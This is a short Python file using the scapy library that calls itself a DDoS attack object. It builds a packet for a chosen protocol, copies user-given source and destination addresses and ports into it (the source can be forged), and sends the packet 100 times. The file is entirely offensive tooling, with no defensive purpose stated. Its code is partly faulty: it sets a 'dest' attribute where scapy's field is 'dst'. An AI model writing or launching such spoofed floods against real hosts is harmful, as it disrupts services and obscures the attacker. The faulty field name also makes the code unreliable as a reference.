"""
This part will create a DDoS attack object
most of the simple parameters will be placed here
to change the attack object
"""

from scapy.all import *

class base_attack_class():
    
    def __init__(self, script_args):
        self.packets = []
        self.script_args = script_args
        
    def construct_empty_packets(self):
        packet_dict = {
            "IP" : IP(),
            "TCP" : IP()/TCP(),
            "UDP" : IP()/UDP(),
            "ICMP" : IP()/ICMP()
        }
        protocol = self.script_args["protocol"]
        required_base_packet = packet_dict[protocol]
        self.packets.append(required_base_packet)
        #self.packets[0].dest = "127.0.0.1"
        #send(self.packets[0])

    def add_base_packet_parameters(self):
        # Whatever base parameters are required, will go here
        # And will be added to the packets list
        # Hard coded
        protocol = self.script_args["protocol"]
        for name in self.script_args.keys():
            value = self.script_args[name]
            print(name, value)
            if(name == "src"):
                self.packets[0][IP].src = value
            elif(name == "dest"):
                self.packets[0][IP].dest = value
            elif(name == "dport" and protocol == "TCP"):
                self.packets[0][TCP].dport = value
            elif(name == "dport" and protocol == "UDP"):
                self.packets[0][UDP].dport = value
            elif(name == "sport" and protocol == "TCP"):
                self.packets[0][TCP].sport = value
            elif(name == "sport" and protocol == "UDP"):
                self.packets[0][UDP].sport = value

def create_ddos_attack_object(script_args):
    print(script_args)
    base_attack_object = base_attack_class(script_args)
    base_attack_object.construct_empty_packets()
    base_attack_object.add_base_packet_parameters()
    send(base_attack_object.packets[0], count=100)
    return base_attack_object